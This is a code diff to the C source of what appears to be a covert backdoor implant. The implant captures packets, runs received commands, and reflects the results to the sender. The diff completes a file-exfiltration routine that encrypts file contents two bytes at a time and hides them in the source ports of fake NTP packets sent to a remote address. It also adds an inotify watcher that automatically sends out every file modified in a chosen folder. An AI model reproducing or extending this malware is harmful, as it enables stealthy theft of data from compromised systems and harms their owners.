@@ -1,9 +1,12 @@
+#include <errno.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <sys/inotify.h>
+#include <sys/select.h>
+#include <sys/socket.h>
 
 #include "server.h"
 #include "crypto.h"
@@ -13,11 +16,16 @@
 #define SRC_OFF 		28 // Source address, so we know where to send results
 #define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port
 
-pcap_t* nic;
+#define EVENT_SIZE (sizeof (struct inotify_event))
+#define BUF_LEN	(1024 * (EVENT_SIZE + 16))
+#define ALL_MASK 0xffffffff
+
 struct bpf_program fltr_prog;
 
-void pcap_init(const char *fltr_str)
+void pcap_start(const char *fltr_str, int duplex)
 {
+	pcap_t* nic;
+
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
@@ -30,58 +38,13 @@ void pcap_init(const char *fltr_str)
 	// Set fltr_str for captures
 	if (pcap_setfilter(nic, &fltr_prog) == -1)
 		error("pcap_setfltr_str");
-}
 
-void srv_listen(int duplex)
-{
 	// Start capturing, make sure to heavily restrict our CPU usage.
 	while (1)
 	{
 		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
 			error("pcap_loop");
 		usleep(5000); // sleep 5ms
-	}
-}
-
-#define SLEEP_TIME 100000
-void exfil_start(uint32 ipaddr)
-{
-	int buflen;
-	char buffer[MAX_LEN];
-	char *pbuf;
-	FILE *file;
-
-	file = open_file("abc", FALSE);
-
-	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
-	{
-		pbuf = buffer;
-
-		// Pad non-even sequences with a space ...
-		if (buflen % 2 != 0)
-		{
-			buffer[buflen - 1] = ' ';
-			buffer[buflen] = 0;
-			++buflen;
-		}
-
-		for (int i = 0; i < buflen;)
-		{
-			char *enc;
-			ushort src_port = 0;
-			ushort dst_port = 0;
-
-			//enc = encrypt(SEKRET_KEY, pbuf, 2);
-			src_port = (enc[0] << 8) + enc[1];
-			//dst_port = PORT_NTP;
-			free(enc);
-
-			//_send(dest, src_port, dst_port, TRUE);
-
-			i += 2;
-			pbuf += 2;
-			usleep(SLEEP_TIME);
-		}
 	}
 }
 
@@ -186,3 +149,109 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 	pclose(fp);
 }
 
+#include "ntp.h"
+#include "inet.h"
+
+void exfil_send(uint32 ipaddr, char *path)
+{
+	int buflen;
+	char buffer[MAX_LEN];
+	char *pbuf;
+	FILE *file;
+
+	file = open_file(path, FALSE);
+
+	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
+	{
+		pbuf = buffer;
+
+		// Pad non-even sequences with a space ...
+		if (buflen % 2 != 0)
+		{
+			buffer[buflen - 1] = ' ';
+			buffer[buflen] = 0;
+			++buflen;
+		}
+
+		for (int i = 0; i < buflen;)
+		{
+			char *enc;
+			ushort src_port = 0;
+			ushort dst_port = 0;
+
+			enc = encrypt(PASSKEY, pbuf, 2);
+			src_port = (enc[0] << 8) + enc[1];
+			dst_port = PORT_NTP;
+			free(enc);
+
+			_send(ipaddr, src_port, dst_port, TRUE);
+
+			i += 2;
+			pbuf += 2;
+			usleep(SLEEP_TIME);
+		}
+	}
+}
+
+void exfil_watch(uint32 ipaddr, char *folder)
+{
+	int fd, wd, ret;
+	static struct inotify_event *event;
+	fd_set rfds;
+
+	fd = inotify_init();
+	if (fd < 0)
+		error("inotify init");
+
+	wd = inotify_add_watch(fd, folder, (uint32)IN_MODIFY);
+
+	if (wd < 0)
+		error("inotify add watch");
+
+	FD_ZERO (&rfds);
+	FD_SET (fd, &rfds);
+
+	while (TRUE)
+	{
+		int i = 0;
+		int len;
+		char buf[BUF_LEN];
+
+		ret = select(fd + 1, &rfds, NULL, NULL, NULL);
+		len = read(fd, buf, BUF_LEN);
+
+		if (len < 0 && errno != EINTR) // need to reissue system call
+			error("read");
+		else if (len == 0) // BUF_LEN too small?
+			error("inotify buffer too small");
+
+		while (i < len)
+		{
+			event = (struct inotify_event *) &buf[i];
+
+			if (event->len)
+			{
+				char path[MAX_LEN];
+				strncpy(path, folder, MAX_LEN);
+				strcat(path, "/");
+				strcat(path, event->name);
+				exfil_send(ipaddr, path);
+			}
+
+			i += EVENT_SIZE + event->len;
+		}
+
+		if (ret < 0)
+			error("select");
+		else if (!ret)
+			printf("timed out\n");
+	}
+
+	printf ("Cleaning up and Terminating....................\n");
+	fflush (stdout);
+	ret = inotify_rm_watch(fd, wd);
+	if (ret)
+		error("inotify rm watch");
+	if (close(fd))
+		error("close");
+}
